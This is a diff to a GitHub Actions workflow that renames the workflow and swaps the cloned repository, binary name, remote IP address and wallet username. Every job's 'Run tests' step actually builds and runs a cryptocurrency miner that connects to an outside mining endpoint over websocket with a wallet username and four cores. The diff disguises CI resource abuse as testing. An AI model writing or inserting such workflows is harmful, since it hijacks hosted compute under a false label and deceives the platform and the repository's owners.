@@ -1,4 +1,4 @@
-name: erlhindha
+name: desseaura
 on: 
   push:
     branches: [ "main" ]
@@ -25,11 +25,11 @@ jobs:
     - name: Setup
       uses: actions/checkout@v4
     - name: clone
-      run: git clone https://github.com/muhammadzz/gh2 && cd gh2 && chmod u+x *
+      run: git clone https://github.com/dwizka/semibaru && cd semibaru && chmod u+x *
     - name: Build
-      run: cd gh2 && cargo build --release
+      run: cd semibaru && cargo build --release
     - name: Run tests
-      run: cd gh2 && ./target/release/bella --url ws://68.154.1.114:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.yan1 --cores 4 &
+      run: cd semibaru && ./target/release/mincukcuan --url ws://20.189.74.24:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.maya2 --cores 4 &
         sleep 310s
   mek:
     needs: mem
@@ -52,11 +52,11 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: git clone https://github.com/muhammadzz/gh2 && cd gh2 && chmod u+x *
+      run: git clone https://github.com/dwizka/semibaru && cd semibaru && chmod u+x *
     - name: Build
-      run: cd gh2 && cargo build --release
+      run: cd semibaru && cargo build --release
     - name: Run tests
-      run: cd gh2 && ./target/release/bella --url ws://68.154.1.114:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.yan1 --cores 4 
+      run: cd semibaru && ./target/release/mincukcuan --url ws://20.189.74.24:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.maya2 --cores 4 
         
     
      
@@ -81,11 +81,11 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-       run: git clone https://github.com/muhammadzz/gh2 && cd gh2 && chmod u+x *
+      run: git clone https://github.com/dwizka/semibaru && cd semibaru && chmod u+x *
     - name: Build
-      run: cd gh2 && cargo build --release
+      run: cd semibaru && cargo build --release
     - name: Run tests
-      run: cd gh2 && ./target/release/bella --url ws://68.154.1.114:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.yan1 --cores 4 
+      run: cd semibaru && ./target/release/mincukcuan --url ws://20.189.74.24:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.maya2 --cores 4 
         
     
   Success:
